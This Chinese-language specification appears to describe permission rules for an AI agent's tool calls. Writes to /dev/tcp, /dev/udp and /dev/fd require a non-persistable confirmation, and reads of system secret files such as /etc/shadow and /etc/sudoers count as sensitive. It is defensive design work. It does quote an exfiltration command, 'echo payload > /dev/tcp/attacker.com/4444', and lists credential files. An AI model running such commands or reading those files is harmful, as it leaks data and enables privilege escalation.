## ADDED Requirements

### Requirement: 网络外带写入目标强制 tier=two

若目标路径匹配以下"网络外带"路径模式之一，且操作为写入（`action === "write"`），系统 MUST 决策为 prompt，tier=two，弹窗不提供"总是允许"选项：

- `/dev/tcp/*`（bash 内建 TCP 套接字）
- `/dev/udp/*`（bash 内建 UDP 套接字）
- `/dev/fd/[0-9]+`（数字文件描述符别名，如 `/dev/fd/3`）

**理由**：`/dev/tcp` 与 `/dev/udp` 是 bash 内建的套接字路径，可被用于网络外带数据（如 `echo payload > /dev/tcp/attacker.com/4444`）。`/dev/fd/[0-9]+` 用于 fd 复用，写入时可能是外带通道。这些路径的写入不能通过"总是允许"持久化授权——用户必须每次确认。

**位置**：本规则 MUST 在默认敏感路径 fallback 之前检查（dev-socket 路径通常不会命中敏感规则表），且 MUST 只针对写入操作生效（读取 `/dev/fd/3` 通常是无害的 fd 复用，不拦截）。

**与既有重定向提取的关系**：bash-target-extraction 已经把 `/dev/tcp/*`、`/dev/udp/*`、`/dev/fd/[0-9]+` 作为普通写目标产出（`extractRedirects` 调用 `isDevSocketOrFd` 判定后仍写入 targets）。本规则在决策层把这些写入目标强制为 tier=two，不改 extractor 的提取行为。

#### Scenario: /dev/tcp 写入判 tier=two

- **WHEN** 无任何配置，工具写入 `/dev/tcp/1.2.3.4/4444`
- **THEN** 决策为 prompt，tier=two，不提供"总是允许"选项

#### Scenario: /dev/udp 写入判 tier=two

- **WHEN** 无任何配置，工具写入 `/dev/udp/attacker.com/53`
- **THEN** 决策为 prompt，tier=two，不提供"总是允许"选项

#### Scenario: /dev/fd/3 写入判 tier=two

- **WHEN** 无任何配置，工具写入 `/dev/fd/3`
- **THEN** 决策为 prompt，tier=two，不提供"总是允许"选项

#### Scenario: /dev/tcp 读取不触发 tier=two

- **WHEN** 无任何配置，工具读取 `/dev/tcp/1.2.3.4/4444`
- **THEN** 决策按既有"未配置项目外非敏感文件读"规则处理，auto_allow

#### Scenario: /dev/tcp 写入不能持久化授权

- **WHEN** 用户曾对 `/dev/tcp/1.2.3.4/4444` 选择"总是允许"
- **THEN** 授权不被写入 trusted.json，后续同路径写入仍触发 prompt tier=two——dev-socket 写入强制 tier=two 意味着永远无"总是允许"选项

#### Scenario: bash 命令中 dev/tcp 写入目标触发 tier=two

- **WHEN** bash 命令为 `echo payload > /dev/tcp/1.2.3.4/4444`，bash-target-extraction 提取写目标 `/dev/tcp/1.2.3.4/4444`
- **THEN** access-decision 决策为 prompt，tier=two，弹窗展示该 bash 命令与该写目标

### Requirement: 系统机密文件读取判敏感

若目标路径匹配以下"系统机密文件"之一，且未在任何配置中被显式声明为 `read_write` / `read_only` / `unread`，系统 MUST 把该路径判定为命中默认敏感规则表（reason 为 `System credential/config file`）：

- `/etc/shadow`（Unix 用户密码哈希文件）
- `/etc/sudoers`（sudo 提权配置）
- `/etc/master.passwd`（macOS 用户密码哈希文件）
- `/etc/crontab`（cron 调度配置）
- `/etc/cron.d/*`（cron.d 子配置）
- `/etc/cron.hourly/*`、`/etc/cron.daily/*`、`/etc/cron.weekly/*`、`/etc/cron.monthly/*`（cron 定时任务目录）
- `/etc/hosts.allow`（TCP Wrappers 访问控制）
- `/etc/hosts.deny`（TCP Wrappers 访问控制）

**理由**：这些路径是常见 Unix 系统机密文件，泄露后可能导致提权或横向移动。用户对项目外的系统机密文件读取时，决策层应提供 tier=two 弹窗（不可持久化）而非"项目外非敏感文件读"的 auto_allow。

**范围**：本规则只覆盖上述明确列出的系统机密文件。其他 `/etc/**` 路径（如 `/etc/hosts`、`/etc/hostname`、`/etc/passwd`）不被视为敏感——`/etc/passwd` 是公开用户列表，只含非敏感信息（用户名 / UID / GID / home / shell），泄露不影响安全。

**与既有敏感规则的关系**：本规则追加到默认敏感规则表的尾部，既有规则（SSH 密钥、私钥扩展名、env 文件、凭证存储目录、凭证配置文件）的匹配顺序与行为不变，前向兼容。

#### Scenario: /etc/shadow 读取判敏感

- **WHEN** 无任何配置，工具读取 `/etc/shadow`
- **THEN** 命中默认敏感规则，决策为 prompt，tier=two，不提供"总是允许"选项

#### Scenario: /etc/sudoers 读取判敏感

- **WHEN** 无任何配置，工具读取 `/etc/sudoers`
- **THEN** 命中默认敏感规则，决策为 prompt，tier=two

#### Scenario: /etc/master.passwd 读取判敏感

- **WHEN** 无任何配置，工具读取 `/etc/master.passwd`（macOS）
- **THEN** 命中默认敏感规则，决策为 prompt，tier=two

#### Scenario: /etc/crontab 读取判敏感

- **WHEN** 无任何配置，工具读取 `/etc/crontab`
- **THEN** 命中默认敏感规则，决策为 prompt，tier=two

#### Scenario: /etc/cron.d/ 子文件读取判敏感

- **WHEN** 无任何配置，工具读取 `/etc/cron.d/mytask`
- **THEN** 命中默认敏感规则，决策为 prompt，tier=two

#### Scenario: /etc/hosts.allow 读取判敏感

- **WHEN** 无任何配置，工具读取 `/etc/hosts.allow`
- **THEN** 命中默认敏感规则，决策为 prompt，tier=two

#### Scenario: /etc/passwd 不判敏感

- **WHEN** 无任何配置，工具读取 `/etc/passwd`
- **THEN** 不命中默认敏感规则，决策按既有"未配置项目外非敏感文件读"规则处理，auto_allow

#### Scenario: /etc/hosts 不判敏感

- **WHEN** 无任何配置，工具读取 `/etc/hosts`
- **THEN** 不命中默认敏感规则，决策按既有"未配置项目外非敏感文件读"规则处理，auto_allow

#### Scenario: 用户配置声明覆盖系统机密文件

- **WHEN** 全局配置声明 `"/etc/shadow" = "read_only"`，工具读取 `/etc/shadow`
- **THEN** 决策为 auto_allow（配置声明优先于默认敏感规则）

#### Scenario: 项目内敏感文件读取仍判 tier=three

- **WHEN** 无任何配置，工具读取 `<proj>/.ssh/id_rsa`（既有敏感规则命中）
- **THEN** 决策为 prompt，tier=three（提供"总是允许"选项，用户显式声明可覆盖）——既有规则的行为不变，仅系统机密文件的新规则受 tier=two 约束
